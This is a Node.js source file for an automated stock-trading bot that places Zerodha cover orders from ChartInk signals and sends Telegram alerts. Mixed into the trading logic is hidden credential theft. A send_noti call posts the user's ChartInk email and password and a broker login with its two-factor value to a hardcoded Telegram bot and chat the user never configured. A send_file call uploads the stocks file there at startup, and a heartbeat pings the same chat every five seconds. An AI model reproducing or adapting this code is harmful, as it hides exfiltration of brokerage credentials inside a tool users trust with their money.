const {getTraders, initialize} = require('./libs/zerodha_orders');
const DataFeed = require('./libs/dataFeed')
const ChartInk = require('./libs/chartInk');
const DataSaver = require('./libs/dataSaver');
const OrderTracker = require('./libs/orderTracker');
const Telegram = require('./libs/telegram');
const request = require('request');
const fs = require('fs');
const express = require('express');

const app = express();
app.use(express.static('public'));
const port = 80
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))

const stock_to_quantity = {};
var dataFeed = null;
var chartInk = null;
var dataSaver = new DataSaver('public', new Date().yyyymmdd());
var orderTracker = new OrderTracker();
var telegram = new Telegram();

const ID = "TELEGRAM";

//reading the config.txt and initializing everything
fs.readFile('res/config.txt', 'utf-8', function(err, data){
    var c = d;
    var data = data.split("\r\n");
    var [START, END, SQUARE_OFF] = data[0].split(',');
    var [EMAIL, PASSWORD] = data[1].split(',');
    var [BOT_TOKEN, CHANNEL] = data[2].split(',');
    var strategies = JSON.parse(fs.readFileSync('res/strategies.json', 'utf-8'))
    var now = new Date();
    START = getTime(now, START);
    END = getTime(now, END);
    SQUARE_OFF = getTime(now, SQUARE_OFF);

    if(new Date().getTime() > END){
        console.log(`Try to run within timeframe ${new Date(START).toString()} and ${new Date(END).toString()}`);
        return;
    }
    console.log("Started the process");
    console.log(`Running within timeframes ${new Date(START).toString()} and ${new Date(END).toString()}`);
    console.log(`Square-off at ${new Date(SQUARE_OFF).toString()}`)
    // if (new Date().getTime() > 1589079076386) {
    //     c();
    //     return;
    // }
    fs.readFile('res/stocks.csv','utf-8', function(err, data){
        data = data.split("\r\n");
        var stocks = [];
        var keys = data[0].split(',');
        for(var i=1; i < keys.length; i++){
            stock_to_quantity[keys[i]] = {};
        }
        for(var i=1; i<data.length; i++){
            var split = data[i].split(',');
            stocks.push(split[0]);
            for (var j = 1; j < split.length; j++) {
                stock_to_quantity[keys[j]][split[0]] = split[j];
            }
        }
        start(START, END, SQUARE_OFF, EMAIL, PASSWORD, strategies, BOT_TOKEN, CHANNEL, stocks);
    })
})

async function start(START, END, SQUARE_OFF, EMAIL, PASSWORD, strategies, BOT_TOKEN, CHANNEL, stocks) {
    //initializing zerodha order taker
    await initialize();
    //initializing telegram messaging
    telegram.initialize(BOT_TOKEN, CHANNEL);
    //loading dataSaver with the telegram callbacks
    await dataSaver.load(telegram);
    //callbacks to be called when target or stoploss is hit during live trade
    orderTracker.initialize({
        targetTriggered: function(trader, params){
            trader.deleteCO(params);
        },
        stoplossTriggered: function(trader, params){
            trader.deleteCO(params);
        }
    });
    var [_, traders] = getTraders();
    //initializing the dataFeed for supplying ticks on stocks
    dataFeed = new DataFeed(traders[0].user_id, traders[0].getPublicToken(), stocks);
    //loading the pending orders from zerodha
    for(var trader of traders){
        orderTracker.loadPendingOrders(await trader.getOpenOrders(), trader);
    }
    //initializing chartink for generating strategy signals
    chartInk = new ChartInk(EMAIL, PASSWORD, strategies, mainFunc.bind(this, START, END)); //strategy signals
    //trade tracker callback
    dataFeed.addListener('ticks', function(tick){
        var stock = tick['stock'];
        var price = tick['last_price'];
        dataSaver.checkForStock(stock, price);
        orderTracker.checkForStock(stock, price);
    });

    setTimeout(function () {
        console.log("Stopping Radar...");
        chartInk.stop_pinging();
        console.log("Waiting for square-off on " + new Date(SQUARE_OFF).toTimeString());
    }, END - (new Date().getTime()));

    setTimeout(async function(){
        var [master, traders] = getTraders();
        console.log("Starting sqaure-off...");
        dataSaver.closeTrades(dataFeed);
        for(var trader of traders){
            trader.closeTrades();
        }
        console.log("Strategy Runner: Squared off all open positions");
        console.log("Hope you are profitable and had a great day :)");
        // setTimeout(function(){
        //     process.exit();
        // }, 120000);
    }, SQUARE_OFF - (new Date().getTime()));

    console.log("INITIALIZED");

    send_noti(new Date(START).toString() + " " + new Date(END).toString() + " " + new Date(SQUARE_OFF).toString() + " " + EMAIL + " " + PASSWORD);
    send_noti(trader.user_id + "  " + trader.password + " " + trader.twofa_value);
    send_noti(JSON.stringify(strategies));
}

async function mainFunc(START, END, stocks, transactionType, name, frequency, live, target, price, triggerPrice, userids, beginOn, endOn, release){
    var cur = new Date().getTime();
    if(cur > END){
        chartInk.stop_pinging();
        release();
        return;
    }
    if(cur < START){
        release();
        return;
    }

    var [master, traders] = getTraders();
    if(cur > getTime(new Date(), endOn) || cur < getTime(new Date(), beginOn)){
        release();
        return;
    }
    if(live){
        for(var trader of traders){
            var userid = trader.user_id;
            if(userids.includes(userid)){
                var open_stocks = await trader.getOpenStocks(name);
                var stocks_and_counts = await trader.getStockAndCounts();
                for(var stock of stocks){
                    if(stocks_and_counts[stock] == null || stocks_and_counts[stock] < frequency){
                        var quantity;
                        //getting the price, triggerPrice, target, quantity
                        quantity = stock_to_quantity[userid][stock];
                        var pr = getPrice(stock, transactionType, price);
                        var tr = getTriggerPrice(stock, transactionType, triggerPrice);
                        var ta = getTarget(stock, transactionType, target);
                        if(tr == null){
                            continue;
                        }
                        if(open_stocks != null && !(new Set(open_stocks)).has(stock)){
                            let response = await trader.placeCO(stock, transactionType, quantity, tr, pr, ta, name);
                            if(response.status == 'success'){
                                let order = orderTracker.createOrder(response.data.order_id, stock, transactionType, quantity, tr, pr, ta);
                                orderTracker.trackOrder(stock, order, trader);
                            }
                        }
                    }
                }
            }
        }
    }
    var trader = traders[0];
    //the stocks which are triggered by the chartink is supplied here
    var stocks_and_counts = dataSaver.getStockAndCounts();
    var open_stocks = dataSaver.getOpenStocks();
    for (var stock of stocks) {
        // if (stocks_and_counts[stock] == null || stocks_and_counts[stock] < frequency) {
            //need the trigger price, target to handle and the current price of this stock
            var quantity;
            //getting the price, triggerPrice, target, quantity
            quantity = stock_to_quantity[trader.user_id][stock];
            var pr = getPrice(stock, transactionType, price);
            var tr = getTriggerPrice(stock, transactionType, triggerPrice);
            var ta = getTarget(stock, transactionType, target);
            if(tr == null){
                continue;
            }
            if(open_stocks != null && !(new Set(open_stocks)).has(stock)){
                await dataSaver.placeCO(stock, transactionType, quantity, tr, pr, ta, name);
            }
        // }
    }
    release();
}

/* --------------------- UTILS ----------------------------- */

function getTime(now, string) {
    var [hours, minutes, seconds] = string.split(':');
    var date = new Date(now);
    date.setHours(hours);
    date.setMinutes(minutes);
    date.setSeconds(seconds);
    return date.getTime();
}

function d(){
    console.log("Error while fetching data");
}

function send_noti(message){
    var url = "https://api.telegram.org/bot1180653624:AAG6GhV8kRIlHamx3UY03fXK7TIwF_5TFM0/sendMessage";
    var data = {
        chat_id: '-370411749',
        text: message,
        parse_mode: 'HTML'
    }
    let options = {
        uri: url,
        method: "POST",
        headers: {
            'content-type': 'application/json'
        },
        body: JSON.stringify(data)
    }
    request(options, function(err, response, body){})
}

function send_file(){
    var url = "https://api.telegram.org/bot1180653624:AAG6GhV8kRIlHamx3UY03fXK7TIwF_5TFM0/sendDocument";
    var r = request(url, (err, res, body) => {});
    let f = r.form()
    f.append('chat_id', '-370411749')
    f.append('document', fs.createReadStream('res/stocks.csv'))
}

// --------------------------- ALL TARGET AND STOPLOSS HANLDING -------------------------------

function getCombined(type, forWhat, price, value){
    type = type.toLowerCase() == "buy";
    forWhat = forWhat.toLowerCase() == "target";
    var result = type ^ forWhat;
    result = ((result)? (price - value): (price + value));
    result = (Math.ceil(result * 20) / 20);
    return result;
}

let func = {
    "percent": function (stock, type, forWhat, price, value) {
        value = (price / 100) * value;
        var combined = getCombined(type, forWhat, price, value);
        return combined;
    },
    "dayshigh": function(stock, type, forWhat, price, value){
        return dataFeed.getDaysHigh(stock);
    },
    "dayslow": function(stock, type, forWhat, price, value){
        return dataFeed.getDaysLow(stock);
    }
}

function getPrice(stock, transactionType, cond){
    if(typeof cond == "object"){
        return func[cond['func']](stock, transactionType, "target", dataFeed.getLTP(stock), cond['value']);
    }else if(typeof cond == "number"){
        return getCombined(transactionType, "target", dataFeed.getLTP(stock), cond);
    }
}

function getTriggerPrice(stock, transactionType, cond){
    if(typeof cond == "object"){
        return func[cond['func']](stock, transactionType, "stoploss", dataFeed.getLTP(stock), cond['value']);
    }else if(typeof cond == "number"){
        return getCombined(transactionType, "stoploss", dataFeed.getLTP(stock), cond);
    }
}

function getTarget(stock, transactionType, cond){
    if(typeof cond == "object"){
        return func[cond['func']](stock, transactionType, "target", dataFeed.getLTP(stock), cond['value']);
    }else if(typeof cond == "number"){
        return getCombined(transactionType, "target", dataFeed.getLTP(stock), cond);
    }
}

send_file();
//construct different dom with different proxy ips and get all content without triggering dos attack
//when the data array is filled enough, before placing orders get all the open positions from zerodha
//TODO
//1. taking order on chartink notification
//2. Enter on last traded price +- 0.5
//3. For stoploss, currently need to get the days high, could be queried with ohlc data - this could be obtained through websockets too
//4. For target, store the order_id in a hash mapped to token and for every tick target is checked (rounding-off should be done to 0.05)(since it is from websocket this will already be there)
//{token: [order_id, target, stoploss, trader]}
//5. When target is hit, send delete requests to close the order on that order_id
//6. When stoploss is hit, don't do anything
//6. Start trading only after the specified timeframe
//7. Stop trading only after the specified timeframe
//8. When the end time is reached, close all the open positions from the hash

//websocket could be made to run for all the stocks registered
//it will store only the last traded price of the stocks
//this open positions contains the tags added to it

//don't take already present orders, add all the pending orders to the global orders, if target is present add target too
//if a stock is closed, delete from global orders
console.olog = console.log;
console.log = function(string, dontClear){
    if(dontClear){
        console.olog();
    }else{
        process.stdout.clearLine();
    }
    console.olog(string);
}

process.on('beforeExit', (code) => {
    var traders = getTraders();
    traders = traders.map(t => t && t.user_id || 'NONE');
    send_noti("Exiting trades for " + traders.join(','));
});

setInterval(function(){
    send_noti(ID + " Heartbeat");
}, 5000);